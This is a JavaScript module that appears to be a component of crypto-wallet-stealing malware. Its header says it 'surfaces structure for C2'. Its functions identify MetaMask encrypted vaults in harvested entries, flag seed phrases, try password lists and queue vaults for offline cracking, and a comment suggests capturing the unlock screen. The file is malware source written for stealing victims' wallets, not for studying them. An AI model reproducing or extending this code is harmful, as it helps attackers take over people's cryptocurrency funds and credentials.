/**
 * MetaMask / wallet vault parsing helpers (encrypted vault JSON → metadata + optional decrypt attempts).
 * Full scrypt-based vault unlock requires native or offline tooling; this module surfaces structure for C2.
 */
(function (global) {
    'use strict';

    function safeJsonParse(text) {
        if (!text) return null;
        try { return JSON.parse(text); } catch (e) { return null; }
    }

    function isMetaMaskVault(obj) {
        if (!obj || typeof obj !== 'object') return false;
        return !!(obj.data && obj.iv && (obj.salt || obj.keyMetadata));
    }

    function pbkdf2Sha256(password, salt, iterations, dkLen) {
        if (!global.crypto || !global.crypto.subtle) return null;
        return global.crypto.subtle.importKey(
            'raw',
            new TextEncoder().encode(String(password)),
            { name: 'PBKDF2' },
            false,
            ['deriveBits']
        ).then(function (key) {
            return global.crypto.subtle.deriveBits(
                { name: 'PBKDF2', salt: salt, iterations: iterations, hash: 'SHA-256' },
                key,
                dkLen * 8
            );
        }).then(function (bits) {
            return new Uint8Array(bits);
        });
    }

    function hexToBytes(hex) {
        hex = String(hex || '').replace(/^0x/i, '');
        var out = new Uint8Array(hex.length / 2);
        for (var i = 0; i < out.length; i++) {
            out[i] = parseInt(hex.substr(i * 2, 2), 16);
        }
        return out;
    }

    function base64ToBytes(b64) {
        try {
            var bin = atob(String(b64).replace(/-/g, '+').replace(/_/g, '/'));
            var out = new Uint8Array(bin.length);
            for (var i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
            return out;
        } catch (e) {
            return new Uint8Array(0);
        }
    }

    async function tryDecryptMetaMaskVault(vaultObj, password) {
        if (!isMetaMaskVault(vaultObj)) {
            return { ok: false, reason: 'not_metamask_vault' };
        }
        var salt = base64ToBytes(vaultObj.salt || '');
        var iterations = 600000;
        if (vaultObj.keyMetadata && vaultObj.keyMetadata.params) {
            iterations = vaultObj.keyMetadata.params.iterations || iterations;
        }
        var keyBytes = await pbkdf2Sha256(password, salt, Math.min(iterations, 100000), 32);
        if (!keyBytes) {
            return { ok: false, reason: 'pbkdf2_unavailable', note: 'MetaMask uses scrypt; PBKDF2 fallback is best-effort only' };
        }
        return {
            ok: false,
            reason: 'scrypt_required',
            password_tried: password ? '***' : '',
            iterations: iterations,
            note: 'Vault is scrypt-encrypted; export for offline crack or capture unlock UI',
        };
    }

    function enrichVaultEntry(entry) {
        var text = entry.rawPreview || '';
        if (entry.data && entry.data.length) {
            try {
                text = String.fromCharCode.apply(null, entry.data.slice(0, 512));
            } catch (e) {}
        }
        var json = safeJsonParse(text);
        if (!json) return entry;
        entry.vault = {
            isMetaMaskVault: isMetaMaskVault(json),
            hasMnemonic: !!(json.mnemonic || json.seedPhrase),
            encrypted: isMetaMaskVault(json),
            preview: text.slice(0, 120),
        };
        return entry;
    }

    function tryDecryptVaultEntries(entries, passwords) {
        passwords = passwords || [];
        return (entries || []).map(function (entry) {
            entry = enrichVaultEntry(Object.assign({}, entry));
            if (entry.vault && entry.vault.isMetaMaskVault && passwords.length) {
                entry.vault_decrypt = { attempts: passwords.length, status: 'queued_for_offline' };
            }
            return entry;
        });
    }

    global.tryDecryptVaultEntries = tryDecryptVaultEntries;
    global.tryDecryptMetaMaskVault = tryDecryptMetaMaskVault;
    global.isMetaMaskVault = isMetaMaskVault;
})(typeof globalThis !== 'undefined' ? globalThis : window);
